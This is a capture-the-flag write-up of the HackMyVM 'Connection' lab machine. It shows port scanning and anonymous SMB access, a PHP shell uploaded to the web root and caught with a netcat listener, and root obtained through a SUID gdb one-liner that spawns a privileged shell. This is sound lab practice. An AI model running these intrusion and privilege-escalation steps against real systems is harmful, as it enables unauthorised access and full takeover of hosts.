---
title: HackMyVM - Connection
description: My writeup on Connection box.
categories:
 - HackMyVM
tags: HackMyVM smb gdb suid
---

![](https://i.imgur.com/VYEVjve.png)

You can start playing there > [HackMyVM](https://hackmyvm.eu/){:target="_blank"}

## Summary

I found this really cool lab, similar to vulnhub but has point system/ranking etc. I suggest you to try this out, 101% worth it. We start by finding a share on SMB that we can connect as anonymous and we can upload our shell there this gives us a shell as www-data. Privesc to root is a simple SUID exploitation. Let’s pwn it! :sunglasses:

## Enumeration/Reconnaissance

Let's start as always with nmap.

```
$ ip=192.168.1.17
$ nmap -p- --min-rate 10000 $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-01 12:27 EEST
Nmap scan report for connection.zte.com.cn (192.168.1.17)
Host is up (0.00020s latency).
Not shown: 65531 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 08:00:27:49:78:7B (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.20 seconds
$ nmap -p 22,80,139,445 -sC -sV -oN nmap/initial $ip 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-01 12:28 EEST
Nmap scan report for connection.zte.com.cn (192.168.1.17)
Host is up (0.00047s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 b7:e6:01:b5:f9:06:a1:ea:40:04:29:44:f4:df:22:a1 (RSA)
|   256 fb:16:94:df:93:89:c7:56:85:84:22:9e:a0:be:7c:95 (ECDSA)
|_  256 45:2e:fb:87:04:eb:d1:8b:92:6f:6a:ea:5a:a2:a1:1c (ED25519)
80/tcp  open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
```

Let's start with SMB, as always let's list the shares.

```
$ smbmap -H $ip
[+] IP: 192.168.1.17:445	Name: connection.zte.com.cn                             
 Disk                                               Permissions	Comment
	----                                               -----------	-------
	share                                             	READ ONLY	
	print$                                            	NO ACCESS	  Printer Drivers
	IPC$                                              	NO ACCESS	  IPC Service (Private Share for uploading files)
```

Let's connect to `share`:

```
$ smbclient //$ip/share
Enter WORKGROUP\root's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: > ls
  .                                   D        0  Wed Sep 23 04:48:39 2020
  ..                                  D        0  Wed Sep 23 04:48:39 2020
  html                                D        0  Thu Oct  1 12:32:02 2020

		7158264 blocks of size 1024. 5462992 blocks available
smb: > cd html
smb: html> ls
  .                                   D        0  Thu Oct  1 12:32:02 2020
  ..                                  D        0  Wed Sep 23 04:48:39 2020
  index.html                          N    10701  Wed Sep 23 04:48:45 2020

		7158264 blocks of size 1024. 5462992 blocks available
smb: html> 
```

We have access to web content, we can simply upload our shell and execute it!

## Shell as www-data

```
smb: html> put shell.php
putting file shell.php as \html\shell.php (1073.0 kb/s) (average 1073.0 kb/s)
smb: html> exit
$ curl http://$ip/shell.php
```

```
$ nc -lvp 5555
listening on [any] 5555 ...

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@connection:/$ whoami;id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Shell as root

If we search for SUIDS, we can see `gdb` is set as SUID we can simply exploit this to get root shell:

```
www-data@connection:/home/connection$ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 51184 Jul  5 12:10 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
-rwsr-sr-x 1 root root 8008480 Oct 14  2019 /usr/bin/gdb
-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
```

```
www-data@connection:/home/connection$ gdb -q -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
# whoami;id
whoami;id
root
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```

Let's read the flags:

```
# cat /root/proof.txt | cut -c1-10          
a7c6ea4931
# cat /home/connection/local.txt | cut -c1-10
3f491443a2
```

Good one!
